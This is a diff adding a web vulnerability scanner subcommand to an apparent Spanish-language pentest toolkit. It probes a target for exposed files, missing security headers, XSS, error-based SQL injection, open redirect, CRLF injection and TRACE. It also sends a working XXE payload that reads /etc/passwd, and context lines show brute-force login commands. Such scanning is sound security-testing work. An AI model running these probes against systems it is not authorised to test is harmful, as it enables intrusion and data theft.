@@ -223,6 +223,132 @@ def basic(url, usuario, lista, limite, seco=False, pausa=1):
     return 1
 
 
+FIRMAS_SQL = ("you have an error in your sql syntax",
+              "warning: mysql", "mysqli_sql_exception", "pg_query()",
+              "sqlite3::sqlexception", "sqlstate[", "odbc sql server driver",
+              "quoted string not properly terminated")
+SENSIBLE = (("tarjeta de crédito", r"\b(?:\d{4}[- ]){3}\d{4}\b"),
+            ("clave AWS", r"\bAKIA[0-9A-Z]{16}\b"),
+            ("private key", r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----"))
+
+
+def owasp(url, parametro=None, xml_url=None, seco=False):
+    """Barrido OWASP rápido y acotado (~20 peticiones): cabeceras de
+    seguridad, cookies, listados y ficheros expuestos, XSS reflejado,
+    SQLi por error, open redirect, CRLF, método TRACE y datos sensibles
+    en la portada. Inspirado en el top-10 de frohrer.com y sus scripts;
+    sin falsas garantías: cada hallazgo es una pista a confirmar."""
+    partes = urlsplit(url)
+    if partes.scheme not in {"http", "https"} or not partes.hostname:
+        raise ValueError("--url debe ser http(s)://host[/ruta]")
+    if seco:
+        print(f"Plan: barrido OWASP de ~20 GET/POST acotados contra "
+              f"{url}: cabeceras, "
+              "cookies, .git/.env/robots, listado de directorios, XSS "
+              "reflejado, SQLi por error, open redirect, CRLF, TRACE, "
+              "datos sensibles" + (" y XXE en --xml-url" if xml_url else ""))
+        return 0
+    opener = build_opener(SinRedireccion, HTTPCookieProcessor())
+    hallazgos = 0
+
+    def avisa(grado, texto):
+        nonlocal hallazgos
+        if grado == "HALLAZGO":
+            hallazgos += 1
+        print(f"{grado}: {texto}")
+
+    estado, cab, cuerpo = consultar(opener, url)
+    base = f"{partes.scheme}://{partes.netloc}"
+    cuerpo_txt = cuerpo.decode("utf-8", "replace")
+    avisa("info", f"GET {url} -> {estado} "
+          f"(server: {cab.get('Server', 'oculto')})")
+    if "Index of /" in cuerpo_txt[:400]:
+        avisa("HALLAZGO", "listado de directorios activo en la portada")
+    cab_low = {k.lower(): v for k, v in cab.items()}
+    if partes.scheme == "https":
+        if "strict-transport-security" not in cab_low:
+            avisa("HALLAZGO", "HTTPS sin HSTS (Strict-Transport-Security)")
+    if not any(x in cab_low for x in ("x-frame-options", "content-security-policy")):
+        avisa("HALLAZGO", "sin X-Frame-Options ni CSP: clickjacking posible")
+    if "x-content-type-options" not in cab_low:
+        avisa("info", "sin X-Content-Type-Options: sniffing MIME posible")
+    for cookie in cab.get_all("Set-Cookie") or []:
+        faltan = [f for f, ok in (("HttpOnly", "httponly" in cookie.lower()),
+                                  ("Secure", "secure" in cookie.lower()),
+                                  ("SameSite", "samesite" in cookie.lower()))
+                  if not ok]
+        if faltan and "=" in cookie and cookie.split("=")[1].strip(";"):
+            avisa("HALLAZGO", f"cookie '{cookie.split('=')[0]}' sin "
+                  f"{', '.join(faltan)}")
+    for ruta_prueba, firma in (("/.git/config", "[core]"),
+                               ("/.env", "="),
+                               ("/composer.json", '"require"')):
+        e2, _, c2 = consultar(opener, base + ruta_prueba)
+        if e2 == 200 and firma in c2.decode("utf-8", "replace"):
+            avisa("HALLAZGO", f"{ruta_prueba} accesible (revisa qué fuga)")
+    e2, _, c2 = consultar(opener, base + "/robots.txt")
+    if e2 == 200:
+        desallow = [l.split(":", 1)[1].strip()
+                    for l in c2.decode("utf-8", "replace").splitlines()
+                    if l.lower().startswith("disallow") and ":" in l]
+        if desallow:
+            avisa("info", "robots.txt delata rutas: " + ", ".join(desallow[:6]))
+    marcador = "kitxss9f3"
+    for nombre in ([parametro] if parametro else ("id", "q", "page")):
+        prueba = f"{url}{'&' if '?' in url else '?'}{nombre}={marcador}%3C%71%3E"
+        e2, _, c2 = consultar(opener, prueba)
+        texto = c2.decode("utf-8", "replace")
+        if marcador + "<q>" in texto:
+            avisa("HALLAZGO", f"XSS reflejado SIN escapar en ?{nombre} "
+                  f"(marcador con <q> literal)")
+            break
+        if marcador in texto:
+            avisa("info", f"?{nombre} refleja pero escapa el HTML")
+    e2, _, c2 = consultar(opener, f"{url}{'&' if '?' in url else '?'}"
+                          f"{'id' if '?' not in url else parametro or 'id'}=1%27")
+    texto = c2.decode("utf-8", "replace").lower()
+    for firma in FIRMAS_SQL:
+        if firma in texto:
+            avisa("HALLAZGO", f"SQLi probable: el apóstrofo disparó «{firma}»")
+            break
+    e2, loc, _ = consultar(opener, f"{url}{'&' if '?' in url else '?'}"
+                           f"next={base.replace('http', 'http', 1)}"
+                           ".kit-redirect.test%2f%2f@evil.example")
+    if e2 in (301, 302, 303, 307, 308) and "evil.example" in (loc.get("Location") or ""):
+        avisa("HALLAZGO", "open redirect: el parámetro next= saca del dominio")
+    e2, cab3, _ = consultar(opener, base + "/kit%0d%0aKitCRLF-marker")
+    if any("KitCRLF-marker" in str(v) for v in cab3.values()):
+        avisa("HALLAZGO", "inyección CRLF en cabeceras (ruta reflejada)")
+    peticion = Request(base, data=b"", method="TRACE")
+    try:
+        e2, _, c2 = opener.open(peticion, timeout=15).status, None, None
+    except HTTPError as exc:
+        e2 = exc.code
+    except URLError:
+        e2 = 0
+    if e2 == 200:
+        avisa("HALLAZGO", "método TRACE habilitado (XST / robo de cookies)")
+    for nombre, patron in SENSIBLE:
+        import re as _re
+        if _re.search(patron, cuerpo_txt):
+            avisa("HALLAZGO", f"portada con posible {nombre} en claro")
+    if xml_url:
+        xxe = ('<?xml version="1.0"?><!DOCTYPE k [<!ENTITY xxe SYSTEM '
+               '"file:///etc/passwd">]><k>&xxe;</k>').encode()
+        peticion = Request(xml_url, data=xxe, method="POST",
+                           headers={"Content-Type": "application/xml"})
+        try:
+            respuesta = opener.open(peticion, timeout=20)
+            texto = respuesta.read(65536).decode("utf-8", "replace")
+        except HTTPError as exc:
+            texto = exc.read(65536).decode("utf-8", "replace")
+        if "root:x:" in texto:
+            avisa("HALLAZGO", f"XXE en {xml_url}: /etc/passwd reflejado")
+    print(f"total: {hallazgos} hallazgos (cada uno es pista, no sentencia; "
+          "confírmalos a mano)")
+    return 0 if hallazgos else 1
+
+
 def main():
     parser = argparse.ArgumentParser(description=__doc__)
     sub = parser.add_subparsers(dest="accion", required=True)
@@ -239,6 +365,12 @@ def main():
     sql.add_argument("--valor", required=True)
     sql.add_argument("--indicador", required=True)
     sql.add_argument("--dry-run", action="store_true")
+    ow = sub.add_parser("web-owasp")
+    ow.add_argument("--url", required=True)
+    ow.add_argument("--param", help="parámetro a sondear para XSS/SQLi "
+                                    "(por defecto id, q, page)")
+    ow.add_argument("--xml-url", help="endpoint XML para la prueba XXE")
+    ow.add_argument("--dry-run", action="store_true")
     bas = sub.add_parser("web-basic")
     bas.add_argument("--url", required=True)
     bas.add_argument("--usuario", required=True)
@@ -248,6 +380,8 @@ def main():
     bas.add_argument("--dry-run", action="store_true")
     args = parser.parse_args()
     try:
+        if args.accion == "web-owasp":
+            return owasp(args.url, args.param, args.xml_url, args.dry_run)
         if args.accion == "web-login":
             return login(args.url, args.usuario, args.wl, args.limite_intentos, args.dry_run)
         if args.accion == "web-basic":
